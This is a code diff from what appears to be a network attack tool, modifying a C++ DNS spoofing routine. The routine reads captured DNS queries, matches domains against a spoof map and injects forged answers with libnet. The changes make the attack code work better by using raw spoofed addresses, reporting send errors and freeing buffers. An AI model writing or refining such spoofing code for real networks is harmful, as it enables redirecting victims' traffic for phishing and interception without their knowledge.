@@ -12,12 +12,12 @@
 
 #include "../helper.h"
 
-std::string getSpoofedAddressForThisSite(char *questionedSite) {
+char *getSpoofedAddressForThisSite(char *questionedSite) {
     std::string questionedAddressString(questionedSite);
     char dotArray[] = {'\u0002', '\u0003', '\u0004', '.'};
-    std::map<std::string, std::string>::iterator it;
-    std::shared_ptr<std::map<std::string, std::string>> spoofMap = getSpoofMap();
-    for (it = spoofMap->begin(); it != spoofMap->end(); it++ ) {
+    std::map<std::string, char *>::iterator it;
+    std::shared_ptr<std::map<std::string, char *>> spoofMap = getSpoofMap();
+    for (it = spoofMap->begin(); it != spoofMap->end(); it++) {
         std::size_t found = questionedAddressString.find(it->first);    // find domain in questionedAddress
         if (found == std::string::npos) continue;
         for (char &beginDot : dotArray) {
@@ -31,7 +31,7 @@ std::string getSpoofedAddressForThisSite(char *questionedSite) {
             }
         }
     }
-    return "";
+    return nullptr;
 }
 
 bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
@@ -56,15 +56,10 @@ bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
 
                 char questionedAddress[dns_query_size];
                 strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));
-                std::string spoofedSite = getSpoofedAddressForThisSite(questionedAddress);
-                if (spoofedSite.compare("") != 0) {
+                char *spoofedSite = getSpoofedAddressForThisSite(questionedAddress);
+                if (spoofedSite != nullptr) {
 
-                    struct hostent *addrent = gethostbyname(spoofedSite.c_str());
-                    if (addrent->h_length != 4) {
-                        printf("%s", "ERROR!");
-                    }
-
-                    struct dns_answer answer = dns_answer((unsigned char*)addrent->h_addr);
+                    struct dns_answer answer = dns_answer((unsigned char *) spoofedSite);
 
                     u_int32_t datalen = dns_query_size + sizeof(struct QUESTION) + DNS_ANSWER_SIZE;
                     u_int8_t *data = (u_int8_t *) (malloc(datalen));
@@ -86,11 +81,17 @@ bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
                             ln                             /* libnet hook */
                     );
 
-                    libnet_write(ln);
-                    unsigned char* address = (unsigned char*) addrent->h_addr;
-                    std::cout << questionedAddress << " -> " << spoofedSite
-                              <<" (" << (int)address[0] << "." <<(int)address[1] << "."
-                              << (int)address[2] << "." << (int)address[3] << ")\n";
+                    int result = libnet_write(ln);
+                    if (result == -1) {
+                        printf("fd: %d\n", ln->fd);
+                        printf("Error while sending DNS spoof: %s\n", libnet_geterror(ln));
+                    }
+                    unsigned char *address = (unsigned char *) spoofedSite;
+                    std::cout << questionedAddress << " -> "
+                              << " (" << (int) address[0] << "." << (int) address[1] << "."
+                              << (int) address[2] << "." << (int) address[3] << ")\n";
+                    free(data);
+                    libnet_clear_packet(ln);
                     return true;
                 }
             }
